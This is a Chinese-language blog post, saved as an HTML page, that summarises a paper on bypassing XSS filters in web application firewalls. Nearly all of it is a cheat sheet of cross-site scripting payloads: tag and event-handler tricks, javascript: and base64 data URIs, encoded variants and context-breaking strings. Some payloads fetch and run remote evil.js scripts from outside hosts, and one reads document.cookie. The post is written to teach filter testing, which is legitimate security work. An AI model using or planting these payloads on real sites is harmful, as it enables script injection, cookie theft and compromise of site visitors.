<!doctype html>
<html class="theme-next use-motion ">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>




<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>


    <meta name="description" content="jsut 4 fun" />



  <meta name="keywords" content="xss," />



  <link rel="alternate" href="/atom.xml" title="Go7hic" type="application/atom+xml" />



  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />


<meta name="description" content="0x00 背景本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所">
<meta property="og:type" content="article">
<meta property="og:title" content="Bypass xss 过滤的测试方法">
<meta property="og:url" content="http://blog.yongyuan.us/2014/09/15/2014-09-15-Bypass xss 过滤的测试方法/index.html">
<meta property="og:site_name" content="Go7hic">
<meta property="og:description" content="0x00 背景本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所">
<meta property="og:image" content="http://blog.yongyuan.us/x">
<meta property="og:image" content="http://blog.yongyuan.us/1">
<meta property="og:updated_time" content="2016-01-03T16:02:58.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bypass xss 过滤的测试方法">
<meta name="twitter:description" content="0x00 背景本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所">


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'hide'
  };
</script>

  <title> Bypass xss 过滤的测试方法 | Go7hic </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  



  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand" rel="start">
      <span class="logo">
        <i class="icon-next-logo"></i>
      </span>
      <span class="site-title">Go7hic</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            <i class="menu-item-icon icon-next-home"></i> <br />
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            <i class="menu-item-icon icon-next-archives"></i> <br />
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            <i class="menu-item-icon icon-next-tags"></i> <br />
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            <i class="menu-item-icon icon-next-about"></i> <br />
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 

  <div id="posts" class="posts-expand">
    

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              Bypass xss 过滤的测试方法
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2014-09-15T00:00:00+08:00" content="2014-09-15">
            2014-09-15
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2014/09/15/2014-09-15-Bypass xss 过滤的测试方法/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2014/09/15/2014-09-15-Bypass xss 过滤的测试方法/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        <span itemprop="articleBody"><h4 id="0x00_背景">0x00 背景</h4><p>本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所以呢，基本可以通用于其他xss过滤的场景。方便新手们比较快速的了解到测试xss的一些基本的方法。</p>
<h4 id="0x01_Bypassing黑名单">0x01 Bypassing黑名单</h4><p>大多数的场所是用的黑名单来做过滤器的，有三种方式绕过黑名单的测试：</p>
<ul>
<li>1、暴力测试（输入大量的payload，看返回结果）</li>
<li>2、根据正则推算</li>
<li><p>3、利用浏览器bug</p>
</li>
<li><p>1)尝试插入比较正常的HTML标签，例如：<b>，<i>，<u>来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</u></i></b></p>
</li>
<li><p>2)尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。</p>
</li>
<li><p>3)然后测试几个XSS的payload，基本所有的xss过滤器都会进行过滤的：</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt(1);</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">confirm(1);</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">scriptsrc="http:</span>//<span class="attribute">rhainfosec.com</span>/<span class="attribute">evil.js</span>"&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert,prompt,confirm字符，再尝试大小写的组合：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">scRiPt</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="title">scrIPt</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>4)如果过滤器仅仅是把<script>和</script>标签过滤掉，那么可以用<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure></p>
<p>的方式来绕过，这样当<script>标签被过滤掉，剩下的组合起来刚好形成一个完整的payload。</p>
<p>5)用<a href标签来测试，看返回响应
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.google.com"</span>&gt;</span>Clickme<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>&lt;a标签是否被过滤 href是否被过滤 href里的数据是否被过滤</p>
<p>如果没有数据被过滤，插入javascript协议看看：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert(1)"</span>&gt;</span>Clickme<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>是否返回错误 javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符 尝试下大小写转换</p>
<p>继续测试事件触发执行javascript：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">a</span> href=<span class="string">"rhainfosec.com"</span> onmouseover=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>看onmouseover事件是否被过滤。测试一个无效的事件，看过滤规则：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">a</span> href=<span class="string">"rhainfosec.com"</span> onclimbatree=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>是完整的返回了呢，还是跟onmouseover一样被干掉了。</p>
<p>如果是完整的返回的话呢，那么意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件测试一个很少见的事件：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onhashchange=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&gt;&lt;<span class="tag">a</span> href=#&gt;clickit</span><br></pre></td></tr></table></figure></p>
<p>测试其他标签</p>
<p>接下来测试其他的标签跟属性</p>
<p>Src属性<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span>/<span class="attribute">src</span>=<span class="value">aaa.jpg</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">video</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">audio</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>iframe标签<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"javascript:alert(2)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span>/<span class="attribute">src</span>=<span class="value">"data:text/html;	base64</span><br><span class="line">,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>embed标签<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed<span class="regexp">/src=/</span><span class="regexp">/goo.gl/</span>nlX0P&gt;</span><br></pre></td></tr></table></figure></p>
<p>action属性</p>
<p>利用<form，<isindex等标签中的action属性执行javascript
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">isindex</span> <span class="attribute">action</span>=<span class="value">"javascript:alert(1)"</span> <span class="attribute">type</span>=<span class="value">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">isindex</span> <span class="attribute">action</span>=<span class="value">j</span>	<span class="attribute">a</span>	<span class="attribute">vas</span>	<span class="attribute">c</span>	<span class="attribute">r</span>	<span class="attribute">ipt:alert</span>(<span class="attribute">1</span>) <span class="attribute">type</span>=<span class="value">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">isindex</span> <span class="attribute">action</span>=<span class="value">data:text</span>/<span class="attribute">html</span>, <span class="attribute">type</span>=<span class="value">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">formaction='data:text</span>/<span class="attribute">html</span>,&lt;<span class="attribute">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="title">script</span>&gt;</span>'&gt;<span class="tag">&lt;<span class="title">button</span>&gt;</span>CLICK</span></span><br></pre></td></tr></table></figure></p>
<p>formaction属性<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindexformaction=<span class="string">"javascript:alert(1)"</span> type=image&gt;</span><br><span class="line">&lt;<span class="tag">input</span> type=<span class="string">"image"</span> formaction=JaVaScript:<span class="function"><span class="title">alert</span><span class="params">(<span class="number">0</span>)</span></span>&gt;</span><br><span class="line">&lt;form&gt;&lt;<span class="tag">button</span> formaction=javascript:<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&gt;CLICKME</span><br></pre></td></tr></table></figure></p>
<p>background属性<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">table</span> <span class="attribute">background</span>=javascript:<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>&gt;&lt;/table&gt; <span class="comment">// 在Opera 10.5和IE6上有效</span></span><br></pre></td></tr></table></figure></p>
<p>poster属性<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">video</span> poster=javascript:<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span><span class="comment">//&gt;&lt;/video&gt; // Opera 10.5以下有效</span></span><br></pre></td></tr></table></figure></p>
<p>data属性<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;object <span class="typedef"><span class="keyword">data</span>="<span class="keyword">data</span>:text/html;base64,<span class="type">PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4</span>="&gt;</span></span><br><span class="line">&lt;object/<span class="typedef"><span class="keyword">data</span>=//goo.gl/nlX0P?</span></span><br></pre></td></tr></table></figure></p>
<p>code属性<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">applet</span> <span class="attribute">code</span>=<span class="value">"javascript:confirm(document.cookie);"</span>&gt;</span> // Firefox有效</span><br><span class="line"><span class="tag">&lt;<span class="title">embed</span> <span class="attribute">code</span>=<span class="value">"http://businessinfo.co.uk/labs/xss/xss.swf"</span> <span class="attribute">allowscriptaccess</span>=<span class="value">always</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">onload</span>=<span class="value">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">marquee</span>/<span class="attribute">onstart</span>=<span class="value">confirm(2)</span>&gt;</span>/</span><br><span class="line"><span class="tag">&lt;<span class="title">body</span> <span class="attribute">onload</span>=<span class="value">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">select</span> <span class="attribute">autofocus</span> <span class="attribute">onfocus</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">textarea</span> <span class="attribute">autofocus</span> <span class="attribute">onfocus</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">keygen</span> <span class="attribute">autofocus</span> <span class="attribute">onfocus</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">video</span>&gt;</span><span class="tag">&lt;<span class="title">source</span> <span class="attribute">onerror</span>=<span class="value">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>最短的测试向量<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=open()&gt;</span><br><span class="line">&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效</span><br><span class="line">&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;</span><br><span class="line">&lt;bodylanguage=vbsonload=alert-1//IE8有效</span><br><span class="line">&lt;command onmouseover</span><br><span class="line">="<span class="command">\x</span>6A<span class="command">\x</span>61<span class="command">\x</span>76<span class="command">\x</span>61<span class="command">\x</span>53<span class="command">\x</span>43<span class="command">\x</span>52<span class="command">\x</span>49<span class="command">\x</span>50<span class="command">\x</span>54<span class="command">\x</span>26<span class="command">\x</span>63<span class="command">\x</span>6F<span class="command">\x</span>6C<span class="command">\x</span>6F<span class="command">\x</span>6E<span class="command">\x</span>3B<span class="command">\x</span>63<span class="command">\x</span>6F<span class="command">\x</span>6E<span class="command">\x</span>6 6<span class="command">\x</span>69<span class="command">\x</span>72<span class="command">\x</span>6D<span class="command">\x</span>26<span class="command">\x</span>6C<span class="command">\x</span>70<span class="command">\x</span>61<span class="command">\x</span>72<span class="command">\x</span>3B<span class="command">\x</span>31<span class="command">\x</span>26<span class="command">\x</span>72<span class="command">\x</span>70<span class="command">\x</span>61<span class="command">\x</span>72<span class="command">\x</span>3B"&gt;Save&lt;/command&gt; //IE8有效</span><br></pre></td></tr></table></figure></p>
<p>过滤括号的情况下</p>
<p>当括号被过滤的时候可以使用throw来绕过<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">onmouseover</span>=<span class="value">"javascript:window.onerror=alert;throw 1&gt;</span><br><span class="line">&lt;img src=x onerror="</span><span class="value">javascript:window.onerror=alert;throw</span> <span class="attribute">1</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=javascript:<span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span>;&gt;</span><br></pre></td></tr></table></figure></p>
<p>expression属性<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">style</span>=<span class="value">"xss:expression(alert(0))"</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">style</span>=<span class="value">"color:rgb(''&amp;#0;x:expression(alert(1))"</span>&gt;</span><span class="tag">&lt;/<span class="title">div</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="id">#test</span><span class="rules">&#123;<span class="rule"><span class="attribute">x</span>:<span class="value"><span class="function">expression</span>(<span class="function">alert</span>(/XSS/))&#125;</span></span></span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span> // IE7以下</span><br></pre></td></tr></table></figure></p>
<p>location属性<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">a</span> onmouseover=location=<span class="string">'javascript:alert(1)'</span>&gt;click</span><br><span class="line">&lt;<span class="tag">body</span> onfocus=<span class="string">"loaction='javascript:alert(1)'"</span>&gt;<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>其他的一些payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"refresh"</span> <span class="attribute">content</span>=<span class="value">"0;url=//goo.gl/nlX0P"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"refresh"</span> <span class="attribute">content</span>=<span class="value">"0;javascript:alert(1)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">xmlns</span>=<span class="value">"http://www.w3.org/2000/svg"</span>&gt;</span><span class="tag">&lt;<span class="title">g</span> <span class="attribute">onload</span>=<span class="value">"javascript:\u0061lert(1);"</span>&gt;</span><span class="tag">&lt;/<span class="title">g</span>&gt;</span><span class="tag">&lt;/<span class="title">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">xmlns:xlink</span>=<span class="value">"http://www.w3.org/1999/xlink"</span>&gt;</span><span class="tag">&lt;<span class="title">a</span>&gt;</span><span class="tag">&lt;<span class="title">circle</span> <span class="attribute">r</span>=<span class="value">100</span> /&gt;</span><span class="tag">&lt;<span class="title">animate</span> <span class="attribute">attributeName</span>=<span class="value">"xlink:href"</span> <span class="attribute">values</span>=<span class="value">";javascript:alert(1)"</span> <span class="attribute">begin</span>=<span class="value">"0s"</span> <span class="attribute">dur</span>=<span class="value">"0.1s"</span> <span class="attribute">fill</span>=<span class="value">"freeze"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="cdata">&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;</span><span class="tag">&lt;<span class="title">img</span>/<span class="attribute">src</span>=<span class="value">xx:xonerror=alert(2)</span>//"&gt;</span><span class="tag">&lt;/<span class="title">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">content</span>=<span class="value">"</span><br><span class="line"> 1</span><br><span class="line">;JAVASCRIPT: alert(1)"</span> <span class="attribute">http-equiv</span>=<span class="value">"refresh"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">math</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">xlink:href</span>=<span class="value">"//jsfiddle.net/t846h/"</span>&gt;</span>click</span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">"s=document.createElement('script');s.src='//7sbs9y.com1.z0.glb.clouddn.com/evil.js';document.body.appendChild(s);"</span></span></span><br></pre></td></tr></table></figure></p>
<p>当= ( ) ; :被过滤时<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/1/</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> // 通杀所有浏览器</span><br></pre></td></tr></table></figure></p>
<p>opera中可以不闭合<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">alert( <span class="number">1</span>) <span class="comment">// Opera可查</span></span></span><br></pre></td></tr></table></figure></p>
<p>很多情况下WAF会实体编码用户的输入数据，</p>
<p>javascript是一个很灵活的语言，可以使用很多编码，比如十六进制，Unicode和HTML。但是也对这些编码可以用在哪个位置有规定：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">href</span>=</span><br><span class="line"><span class="constant">action</span>=</span><br><span class="line"><span class="constant">formaction</span>=</span><br><span class="line"><span class="constant">location</span>=</span><br><span class="line"><span class="constant">on</span>*=</span><br><span class="line"><span class="constant">name</span>=</span><br><span class="line"><span class="constant">background</span>=</span><br><span class="line"><span class="constant">poster</span>=</span><br><span class="line"><span class="constant">src</span>=</span><br><span class="line"><span class="constant">code</span>=</span><br></pre></td></tr></table></figure></p>
<p>支持的编码方式：HTML，八进制，十进制，十六进制和Unicode</p>
<p>data=<br>支持的编码：base64</p>
<p>基于上下文的过滤</p>
<p>WAF最大的问题，在于不知道输出的位置的上下文，导致根据具体环境可以绕过。</p>
<p>输入在属性里<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">value</span>=<span class="value">"XSStest"</span> <span class="attribute">type</span>=<span class="value">text</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可控位置为XSStest，可以使用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(0);</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果&lt; &gt;被过滤的话可以换成<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" autofocus onfocus=alert(1)//</span></span><br></pre></td></tr></table></figure></p>
<p>同样还有很多其他的payload：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span> prompt<span class="list">(<span class="number">0</span>)</span>x=<span class="string">"</span><br><span class="line">"</span>onfocusin=alert<span class="list">(<span class="number">1</span>)</span> autofocusx=<span class="string">"</span><br><span class="line">"</span> onfocusout=alert<span class="list">(<span class="number">1</span>)</span> autofocus x=<span class="string">"</span><br><span class="line">"</span>onblur=alert<span class="list">(<span class="number">1</span>)</span> autofocusa=<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
<p>输入在script标签中<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"></span><br><span class="line">Var x=<span class="string">"Input"</span>;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可控位置在Input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">";<span class="function">alert</span>(1)<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>最终结果就是<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"></span><br><span class="line">Var x=<span class="string">""</span>;alert(<span class="number">1</span>)<span class="comment">//</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
